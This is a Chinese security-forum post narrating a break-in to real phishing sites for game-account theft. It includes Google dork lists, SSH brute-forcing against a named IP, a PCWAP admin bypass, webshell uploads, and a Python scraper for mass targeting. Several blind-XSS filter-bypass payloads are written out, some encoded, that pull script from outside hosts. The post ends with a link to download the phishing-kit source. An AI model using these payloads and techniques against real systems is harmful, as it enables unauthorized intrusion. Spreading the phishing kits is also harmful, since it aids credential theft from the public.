[i春秋作家：风在指尖](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

  

前段时间有个网友给我发了个网址，说找到个专门做钓鱼网站的连接，让我看看，然后就引出了下面的一系列事件

[http://mfnyongshihuigui.jiebao8.top](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

网址如下

  
![image.png](https://image.3001.net/images/20180522/15269717983776.png!small)  

  
![image.png](https://image.3001.net/images/20180522/15269718096546.png!small)  

当时也没在意，有天闲着无聊就开干了，

直接打开 jiebao8.top

![image.png](https://image.3001.net/images/20180522/15269718225182.png!small)  

果然是钓鱼站 先对其进行一些信息搜集看看

[http://www.jiebao8.top/robots.txt](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

![image.png](https://image.3001.net/images/20180522/15269718322750.png!small)

对其用谷歌语法搜索，看看是否有以下漏洞，

1目录遍历漏洞 语法为: site:jiebao8.top intitle:index.of

2 配置文件泄露 语法为: site:jiebao8.top ext:xml | ext:conf | ext:cnf | ext:reg |
ext:inf | ext:rdp | ext:cfg | ext:txt | extra | ext:ini

3数据库文件泄露 site:jiebao8.top ext:sql | ext:dbf | ext:mdb

4日志文件泄露 site:jiebao8.top ext:log

5备份和历史文件 site:jiebao8.top ext:bkf | ext:bkp | ext:bak | extld | ext:backup

6SQL错误 site:jiebao8.top intext:"sql syntax near" | intext:"syntax error has
occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL
command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()"
| intext:"Warning: pg_connect()"

7公开文件信息 site:jiebao8.top ext:doc | ext:docx | extdt | ext:pdf | ext:rtf |
ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv

8 phpinfo() site:jiebao8.top ext:php intitle:phpinfo "published by the PHP
Group"

然而没查到什么

将此域名放到情报分析里查看

[https://x.threatbook.cn/domain/mfnyongshihuigui.jiebao8.top](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

发现IP地址一共有230个域名

  

谁没事会注册这么多域名，肯定拿来干坏事

查询此IP162.247.96.114

开放端口:21(ftp),80,102(ssh),3306

对ssh端口进行爆破，无果~

对该域名进行CMS识别

[http://www.yunsee.cn/](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

结果为 PCWAP

![image.png](https://image.3001.net/images/20180522/15269719955364.png!small)

PCWAP一个小众的CMS系统，手里头刚好有个PCWAP的0day越权进后台查看信息  
  

[http://mfnyongshihuigui.jiebao8.top](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

  
![image.png](https://image.3001.net/images/20180522/1526972114754.png!small)  

修改文件上传类型，添加.php

![image.png](https://image.3001.net/images/20180522/15269721228190.png!small)  

![image.png](https://image.3001.net/images/20180522/15269721284694.png!small)  

然后我们上传图片LOGO,因为修改了上传类型，直接上传大马试试上传大马，小马，一句话

  
![image.png](https://image.3001.net/images/20180522/15269721399871.png!small)  

这里大概有20多个钓鱼网站，DNF，吃鸡的

尝试着提权，但是发现执行不了linux命令，可能禁止了

  
![image.png](https://image.3001.net/images/20180522/15269721596446.png!small)

![image.png](https://image.3001.net/images/20180522/15269721664965.png!small)

![image.png](https://image.3001.net/images/20180522/15269721724655.png!small)  

全部都是钓鱼站

我直接打包了所有源码，说实话，我很想对其进行[代码审计](http://bbs.ichunqiu.com/forum-59-1.html?from=beef)，不过，我代码审计不是我的强项

  
![image.png](https://image.3001.net/images/20180522/15269721834592.png!small)  

而且种钓鱼网站我好像搞过，不过当时没盲打进去，现在拿下了源码，我肯定要试试这边的过滤规则

因为我本人不会代码审计，所以说拿到后台以后也只是凭着自己的经验模糊测试在提交账号密码时抓包

输入paylaod

![image.png](https://image.3001.net/images/20180522/15269722027738.png!small)

![image.png](https://image.3001.net/images/20180522/15269722118179.png!small)  

后台看回显

  
![image.png](https://image.3001.net/images/20180522/15269722214996.png!small)  

c标签被成功执行，证明有XSS漏洞， 现在我们来进一步测试

paylaod为

![image.png](https://image.3001.net/images/20180522/15269722332244.png!small)

![image.png](https://image.3001.net/images/20180522/15269722393268.png!small)

  

发现页面被拦截，难道alert是危险字符？换个事件看看

payload:

  

![image.png](https://image.3001.net/images/20180522/15269722504067.png!small)

  
![image.png](https://image.3001.net/images/20180522/15269722608727.png!small)  

成功弹窗，现在我们来开始构造xss paylaod

如果你之前看过我的文章，我发布过很多过狗的xss
paylaod连接如下：[https://bbs.ichunqiu.com/thread-31886-1-1.html](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

我们直接拿来用

  
<svg/onload="[1].find(function(){with(`\docomen\\.1\t\\.1`);;body.appendChild(createElement('script')).src='<http://xss.tv/XA>'})">  

提交数据为

u=21312312&p=<svg/onload="[1].find(function(){with(`\docomen\\.1\t\\.1`);;body.appendChild(createElement('script')).src='<http://xss.tv/XA>'})">&bianhao=1  

![image.png](https://image.3001.net/images/20180522/15269722966564.png!small)  

被拦截了，在测试看看

payload为，对关键字符base64编码试试

u=21312312&p=<object
data="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUkd1V0REUz48L3NjcmlwdD4="></object>
&bianhao=1  

被拦截

用string.fromcharcode函数构造payload 试试

  
u=21312312&p=<b>GO-GO==></b><select autofocus
onfocus=\u0064ocument.write(String.fromCharCode(60,115,101,108,101,99,116,32,97,117,116,111,102,111,99,117,115,32,111,110,102,111,99,117,115,61,115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,80,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,47,47,119,119,119,46,48,50,49,108,97,111,100,111,110,103,102,97,46,99,111,109,47,101,47,55,46,50,46,106,115,39,62))>&bianhao=1  

还是不行 我接近试了上百个payload,回显都是

  
![image.png](https://image.3001.net/images/20180522/15269723284468.png!small)  

被拦截

凭着我单身23年的经验发现这个xss 过滤机制可能没那么简单  
通过不断的模糊测试，发现对方的过滤机制大概如下：  
带有a字符被拦截，已经onmouseover,onload等常见事件全部被过滤，最长处最大长度为32个字符，+，&#等特殊字符被过滤,这就意味着，a标签，各种编码机制都不能用~~真是有够变态的.  
  
但是也通过测试得知能够执行的事件有onscroll,onfocus,onfocus,并且unciode 编码没被过滤  
没过滤的标签为 body，input，br,i 标签

只有32个字符能输入，我目前搜集最短的xss paylaod 20个

也就是

![image.png](https://image.3001.net/images/20180522/15269723546211.png!small)  

但是script早就被过滤了

32个字符，过滤了这么多肯定是构造不了，所以只能用拆分跨站，通过查看源码我发现了一个新的思路，

  
![image.png](https://image.3001.net/images/20180522/15269723621279.png!small)  

就是他后台调用的jquery框架

由此自己研究出了一个新的拆分跨站  
思路就是:  
我们先构造一个函数，只要鼠标滚轮移动，就让所有的事件获取焦点，再用input标签启动onfocus函数
分别加载我的XSS站点（如果你没听懂的话，看看下面的代码）代码如下:  
  

首先我们来了解下 一些javascript的事件以及函数

onscroll 事件 在元素滚动条在滚动时触发。  
onfocus 事件在对象获得焦点时发生。

以及浏览器的一些特性，

当我们输入i标签时，我们不需要输入 闭合标签（原本完整的i标签是）

![image.png](https://image.3001.net/images/20180522/15269723814582.png!small)  
![image.png](https://image.3001.net/images/20180522/15269723942414.png!small)  

而现在我们只需要输入

![image.png](https://image.3001.net/images/20180522/15269724087204.png!small)

即可

我们进入后台查看如下  
![image.png](https://image.3001.net/images/20180522/15269724449781.png!small)  

后面的标签被自动 补上去了 了解了这些，看接下来的最新拆分跨站就容易多了

拆分跨站代码如下

  
![image.png](https://image.3001.net/images/20180522/15269724557105.png!small)这段代码的意思是，只要对方移动鼠标滑轮或者手机端向下面滑动，就会产生出一个事件
$(`*`).focus() 这是jq的选择器，意思是让所有的元素获得焦点然后下面的两个input标签就获取了焦点，
而input标签里有一个事件，onfocus，当input标签获取了焦点的时候，就会触发onfocus函数，我在onfocus函数里的代码意思是
获取i标签里的内容（也就是 $.getScript(`//xs.tv`) ），并且用eval执行它，所以这段代码整体的执行效果  
  
就是只要对方移动了滑轮，就会执行 eval($.getScript(`//xs.tv`))  
如果你还没看明白的话，那就实践试试吧我们把xss paylad 分成5段分别输入进去 效果如下  

![image.png](https://image.3001.net/images/20180522/15269724724299.png!small)通过抓包得出  

![image.png](https://image.3001.net/images/20180522/15269724908051.png!small)![image.png](https://image.3001.net/images/20180522/1526972494260.png!small)

已经成功加载了我的XSS站点，想要拿下这种类型的后台，就需要两位数的域名  
  

根据这个站点的关键词

幸运冒险家启航-心悦俱乐部官方网站

腾讯游戏老兵空降回归-绝地求生官方网站-腾讯游戏 (吃鸡的钓鱼站找不到)

  
![image.png](https://image.3001.net/images/20180522/15269725156410.png!small)  

百度一搜索，全是钓鱼界面 于是我写了个批量攻击的python脚本,先用采集器采集这些钓鱼网址，再批量注入

  
  

import requests

from bs4 import BeautifulSoup

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers={

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101
Firefox/48.0",

'Accept-Language' : 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',

'Connection' : 'keep-alive',

'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

'X-Forwarded-For':'120.239.169.74'

}

#设置头部

proxies={

"http":"<http://127.0.0.1:8080>",

"https":"<https://127.0.0.1:8080>",

}

#设置代理

for i in range(0,200,10): #根据百度的url设置搜索1-20页

bd_search="[https://www.baidu.com/s?wd=](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)幸运冒险家启航-心悦俱乐部官方网站-腾讯游戏&pn=%s" % str(i) #关键词搜索

r=requests.get(bd_search,headers=headers,verify=False,proxies=proxies,timeout=2)
#发起请求

f=open("1.html","a+",encoding="utf-8") #把请求结果保存到1.html里

f.write(r.text)

f.close()

soup=BeautifulSoup(r.text,"lxml")

url_list=soup.select(".t > a") #对请求回来的内容进行查找，找出a标签里（找出钓鱼链接）

for url in url_list:

real_url=url['href'] #遍历循环，并且打印

try:

r=requests.get(real_url,headers=headers,verify=False,proxies=proxies,timeout=2)
#再次请求

print(r.url) #打印出钓鱼链接

f=open("exp.txt","a+",encoding="utf-8")

f.write(r.url+"\n") #把查找到的钓鱼链接保存到exp.txt里

f.close()

except Exception as e:

print(e)

  

  

效果如下，找到的钓鱼链接

![image.png](https://image.3001.net/images/20180522/1526972552433.png!small)  

然后再批量渗透，自己也写了一个批量渗透钓鱼网站的脚本（不打算发，怕被人说我传播黑客工具。。。。）拿到的钓鱼网站大部分貌似都没什么账号密码
就看到这个吃鸡的钓鱼站

  
![image.png](https://image.3001.net/images/20180522/15269725678606.png!small)![image.png](https://image.3001.net/images/20180522/15269725742865.png!small)  

我帮这位老兄删光了

  
![image.png](https://image.3001.net/images/20180522/15269725805739.png!small)  

一个钓鱼站大概一天上百个账号密码，不知道有多少人QQ是这样被盗的此次渗透，可能话比较多，各位别介意，这也是为了XSS基础比较薄弱的学友考虑~~嘿嘿~~~

结局彩蛋：  
吃鸡钓鱼，DNF钓鱼源码也打包好了，链接：<https://pan.baidu.com/s/1WR2V0SsTY8OrIoVxEW0SdA>

[>>>点我得密码](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)[](https://bbs.ichunqiu.com/thread-40592-1-1.html?from=beef)

